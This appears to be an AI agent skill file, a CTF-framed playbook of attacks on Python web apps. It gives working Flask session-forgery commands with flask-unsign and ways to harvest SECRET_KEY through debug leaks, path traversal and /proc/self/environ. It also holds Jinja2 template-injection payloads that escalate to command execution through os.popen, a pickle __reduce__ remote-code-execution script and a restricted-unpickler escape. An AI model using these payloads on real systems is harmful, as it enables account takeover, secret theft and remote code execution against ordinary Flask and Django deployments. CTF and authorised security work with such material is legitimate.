name: python-web-attack
description: Attack techniques for Python web apps (Flask/Django/Jinja2). Covers Flask session forgery (get secret_key → forge admin session), SSTI (Jinja2), pickle deserialization, and common secret_key sources. Targets Flask secret_key forgery and sandbox/pickle escape challenges.
---

# Python Web Attack (Flask / Django / Jinja2 / pickle)

Authorized CTF/assessment use. Python web targets fail in predictable ways. The high-value move is usually NOT login guessing — it is session forgery or SSTI. Find the secret/exec primitive, then escalate.

## 1. Flask session forgery

**Why it works:** Flask signs the session cookie with `SECRET_KEY` (itsdangerous). If you obtain the key, you can forge ANY session — including an admin one — without touching the login form.

**Get the secret_key (in priority order):**
1. **Debug error leak:** trigger a 500/debug page — Werkzeug debugger often dumps `SECRET_KEY` and config.
2. **Source read:** LFI/path-traversal to `app.py`, `config.py`, `.env`, `app/config.py` — the key is a literal in source or env.
3. **Known/weak keys:** try `secret`, `secret_key`, `dev`, `flag{`, the app name, or a `secrets.token_hex` in a leaked `.env`.
4. **`/proc/self/environ`** via LFI → env vars often include `SECRET_KEY`.

**Forge the session:**
```python
# flask-unsign (preferred)
flask-unsign --sign --cookie "{'username':'admin','is_admin':True,'user_id':1}" --secret '<KEY>'
# or pure python
from itsdangerous import URLSafeTimedSerializer, TimestampSigner
from flask.sessions import SecureCookieSessionInterface
```
Set the resulting cookie, reload → admin session → read flag.

**Note:** if the flag is gated behind admin, forging is the whole solve. Don't brute-force the login.

## 2. SSTI (Jinja2 / Jinja template injection)

**Fingerprint:** user input reflected into a `render_template_string` or `{{ }}` evaluated; test with `{{7*7}}` → `49` confirms SSTI.

**Payloads (Jinja2, escalate in order):**
```
{{7*7}}                                                          → confirm
{{config}}                                                       → dump Flask config (may hold SECRET_KEY/flag)
{{''.__class__.__mro__[1].__subclasses__()}}                     → enumerate classes
```
**RCE (classic chain):**
```
{{''.__class__.__mro__[1].__subclasses__()[<idx>]}}              → find <class 'subprocess.Popen'> or os._wrap_close
{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
{{lipsum.__globals__['os'].popen('cat /flag').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}
```
**Filter bypass:** if `_`, `.`, `[` are blocked, use `|attr('__class__')`, `request.args.x`, hex/unicode escapes, or `''['__cl''ass__']` string-concat tricks.

**Verify:** `{{7*7}}` → `49`; then `config`/RCE → flag.

## 3. Pickle deserialization (e2 sandbox / restricted unpickler)

**Where:** endpoints that `pickle.loads(user_input)` or accept a pickled cookie/session.

**Direct RCE (unrestricted):**
```python
import pickle, os, base64
class E:
    def __reduce__(self): return (os.system, ('cat /flag',))
print(base64.b64encode(pickle.dumps(E())))
```
Send the base64 → RCE.

**Restricted unpickler (allowlist) escape — the e2 pattern:**
The allowlist blocks `os.system` directly, but the object graph still links to dangerous classes:
```python
# walk __subclasses__ to a subprocess/os wrapper
list.__mro__  → object → object.__subclasses__() → find os._wrap_close (idx ~141)
os._wrap_close.__init__.__globals__['popen']('cat /flag')
```
Iterate `__subclasses__()` indices to locate `_wrap_close` / `Popen` / `subprocess.Popen`, then reach `__globals__['popen']`.

**Verify:** run a benign `id` first, then `cat /flag`.

## 4. Django (bonus)

- **DEBUG=True + settings leak:** any 404/500 page dumps `SECRET_KEY`, DB creds → forge session / read DB.
- **Pickle cookie (older Django):** session is pickled+signed; with the key, forge a session with admin/flag.
- **SSTI:** Django templates auto-escape, but `|safe`-marked fields or custom template tags can still inject.

## Cross-cutting
- **The secret key is the crown jewel** for Flask/Django: hunt it via error/source/LFI before anything else — a forged admin session beats brute-forcing login every time.
- **SSTI probe is cheap and universal:** `{{7*7}}` on any reflected input.
- **Self-verify** each primitive (`id` / `49` / config dump) before going for the flag.
